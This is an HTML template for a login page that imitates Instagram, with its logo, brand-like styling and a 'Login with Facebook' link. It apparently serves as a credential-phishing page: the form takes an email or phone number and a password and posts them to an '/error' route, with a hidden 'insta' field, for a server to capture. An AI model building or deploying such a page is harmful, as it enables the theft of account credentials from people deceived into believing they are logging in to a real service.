<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            color: #1877f2;
        }
        label {
            font-weight: bold;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #166fe5;
        }
        .facebook-logo {
            display: block;
            margin: 0 auto 20px;
            width: 150px;
        }
        .or-divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }
        .or-divider::before,
        .or-divider::after {
            content: "";
            display: inline-block;
            width: 45%;
            height: 1px;
            background-color: #ddd;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
        }
        .or-divider::before {
            right: calc(100% + 10px);
        }
        .or-divider::after {
            left: calc(100% + 10px);
        }
        .facebook-login {
            text-align: center;
            margin-bottom: 20px;
        }
        .facebook-login img {
            width: 30px;
            vertical-align: middle;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/320px-Instagram_logo.svg.png" alt="Instagram Logo" class="Instagram-logo">
        <h2>Login</h2>
        <p style="color: red;">{{error}}</p>
        <form action="/error" method="post">
            <input type="hidden" id="hidden" name="insta"><br>
            <label for="username">Email or Phone:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password"><br>
            <input type="submit" value="Log In">
        </form>
        <div class="or-divider"> OR </div>
        <div class="facebook-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
            <a href="/facebook">Login with Facebook</a>
        </div>
    </div>
</body>
</html>
